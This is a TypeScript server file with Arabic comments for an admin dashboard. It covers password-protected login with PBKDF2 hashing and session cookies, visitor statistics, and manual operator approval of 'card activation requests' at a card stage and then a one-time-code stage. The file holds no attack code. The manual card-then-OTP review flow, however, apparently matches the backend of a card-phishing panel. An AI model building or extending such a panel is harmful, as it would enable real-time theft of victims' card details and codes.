import { createMiddleware, createServerFn } from "@tanstack/react-start";
import { deleteCookie, getCookie, setCookie } from "@tanstack/react-start/server";

import {
  MIN_PASSWORD_LENGTH,
  SESSION_TTL_SECONDS,
  createSessionSecret,
  createSessionToken,
  hashPassword,
  verifyPassword,
  verifySessionToken,
} from "@/lib/admin-auth";
import {
  loadCardRequests,
  loadVisitorStats,
  type CardRequestsStats,
  type VisitorStats,
} from "@/lib/visitors.functions";

/**
 * دوال لوحة التحكم /admin.
 * - حماية الدخول: كلمة مرور مخزّنة مشفّرة (PBKDF2) في جدول admin_settings.
 * - كل دوال البيانات محمية بـ requireAdmin وتكتب/تقرأ بـ service_role فقط.
 * - ملاحظة: ملفات *.functions.ts بتتبعت لحزمة العميل، لذلك لا نستورد
 *   client.server في الأعلى بل داخل bodies الدوال فقط.
 */

const COOKIE_NAME = "admin_session";
const UUID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

type AdminSettingsRow = {
  id: number;
  password_hash: string | null;
  session_secret: string | null;
  updated_at: string;
};

async function readAdminSettings(): Promise<AdminSettingsRow | null> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data, error } = await supabaseAdmin
    .from("admin_settings")
    .select("id, password_hash, session_secret, updated_at")
    .eq("id", 1)
    .maybeSingle();
  if (error) throw new Error(error.message);
  return data;
}

function sessionCookieOptions() {
  return {
    httpOnly: true,
    sameSite: "lax" as const,
    path: "/",
    maxAge: SESSION_TTL_SECONDS,
    secure: import.meta.env.PROD,
  };
}

async function isAuthenticated(settings: AdminSettingsRow | null): Promise<boolean> {
  if (!settings?.session_secret) return false;
  return verifySessionToken(settings.session_secret, getCookie(COOKIE_NAME));
}

// ------------------------------------------------------------
// حالة الدخول / إنشاء أول كلمة مرور / تسجيل الدخول / الخروج
// ------------------------------------------------------------

export const getAdminAuthState = createServerFn({ method: "GET" }).handler(async () => {
  try {
    const settings = await readAdminSettings();
    return {
      needsSetup: !settings?.password_hash,
      signedIn: await isAuthenticated(settings),
      error: null as string | null,
    };
  } catch (error) {
    return {
      needsSetup: false,
      signedIn: false,
      error:
        error instanceof Error
          ? error.message
          : "تعذر الاتصال بقاعدة البيانات. تأكد من تشغيل supabase-migration.sql.",
    };
  }
});

function parsePassword(input: unknown): { password: string } {
  const password = (input as { password?: unknown } | null)?.password;
  if (typeof password !== "string" || password.trim().length < MIN_PASSWORD_LENGTH) {
    throw new Error(`كلمة المرور لازم تكون ${MIN_PASSWORD_LENGTH} أحرف على الأقل.`);
  }
  return { password: password.trim() };
}

/** أول تشغيل: إنشاء كلمة مرور المشرف (غير مسموح لو موجودة من قبل). */
export const setupAdminPassword = createServerFn({ method: "POST" })
  .validator(parsePassword)
  .handler(async ({ data }) => {
    const existing = await readAdminSettings().catch(() => null);
    if (existing?.password_hash) {
      throw new Error("تم إنشاء كلمة مرور من قبل — استخدم تسجيل الدخول.");
    }

    const passwordHash = await hashPassword(data.password);
    const sessionSecret = createSessionSecret();

    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin.from("admin_settings").upsert(
      {
        id: 1,
        password_hash: passwordHash,
        session_secret: sessionSecret,
        updated_at: new Date().toISOString(),
      },
      { onConflict: "id" },
    );
    if (error) throw new Error(error.message);

    setCookie(COOKIE_NAME, await createSessionToken(sessionSecret), sessionCookieOptions());
    return { ok: true };
  });

export const adminLogin = createServerFn({ method: "POST" })
  .validator(parsePassword)
  .handler(async ({ data }) => {
    const settings = await readAdminSettings();
    if (!settings?.password_hash || !settings.session_secret) {
      throw new Error("لم يتم إنشاء كلمة مرور بعد.");
    }
    if (!(await verifyPassword(data.password, settings.password_hash))) {
      throw new Error("كلمة المرور غير صحيحة.");
    }
    setCookie(
      COOKIE_NAME,
      await createSessionToken(settings.session_secret),
      sessionCookieOptions(),
    );
    return { ok: true };
  });

export const adminLogout = createServerFn({ method: "POST" }).handler(async () => {
  deleteCookie(COOKIE_NAME, { path: "/" });
  return { ok: true };
});

// ------------------------------------------------------------
// حماية دوال البيانات
// ------------------------------------------------------------

export const requireAdmin = createMiddleware({ type: "function" }).server(async ({ next }) => {
  const settings = await readAdminSettings().catch(() => null);
  if (!(await isAuthenticated(settings))) {
    throw new Error("Unauthorized: sign in to /admin first.");
  }
  return next({ context: { admin: true } });
});

export const getAdminVisitorStats = createServerFn({ method: "GET" })
  .middleware([requireAdmin])
  .handler(async (): Promise<VisitorStats> => loadVisitorStats());

export const getAdminCardRequests = createServerFn({ method: "GET" })
  .middleware([requireAdmin])
  .handler(async (): Promise<CardRequestsStats> => loadCardRequests());

/**
 * قبول أو رفض مرحلة من مراحل المراجعة — الداشبورد فقط.
 * card → البطاقة: card_pending تتحول إلى otp_entry أو card_rejected
 * otp  → الكود:   otp_pending تتحول إلى verified أو otp_rejected
 * التحويل يُحسب في السيرفر ولا يُرسل من المتصفح لمنع أي قيّة غير مقصودة.
 */
export const reviewCardRequest = createServerFn({ method: "POST" })
  .middleware([requireAdmin])
  .validator((input: unknown) => {
    const value = input as { id?: unknown; stage?: unknown; action?: unknown } | null;
    if (typeof value?.id !== "string" || !UUID_PATTERN.test(value.id)) {
      throw new Error("معرّف الطلب غير صالح.");
    }
    if (value.stage !== "card" && value.stage !== "otp") {
      throw new Error("المرحلة غير صالحة.");
    }
    if (value.action !== "approve" && value.action !== "reject") {
      throw new Error("الإجراء غير صالح.");
    }
    return {
      id: value.id,
      stage: value.stage as "card" | "otp",
      action: value.action as "approve" | "reject",
    };
  })
  .handler(async ({ data }) => {
    const from = data.stage === "card" ? "card_pending" : "otp_pending";
    const to =
      data.action === "approve"
        ? data.stage === "card"
          ? "otp_entry"
          : "verified"
        : data.stage === "card"
          ? "card_rejected"
          : "otp_rejected";

    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: updated, error } = await supabaseAdmin
      .from("card_activation_requests")
      .update({
        activation_status: to,
        // تاريخ الاعتماد يُكتب فقط عند قبول الكود (اكتمال العملية).
        approved_at: to === "verified" ? new Date().toISOString() : null,
      })
      .eq("id", data.id)
      .eq("activation_status", from)
      .select("id");

    if (error) throw new Error(error.message);
    if (!updated || updated.length === 0) {
      throw new Error("هذا الطلب تغيّر حالته — حدّث الصفحة وحاول مرة أخرى.");
    }
    return { ok: true, status: to };
  });
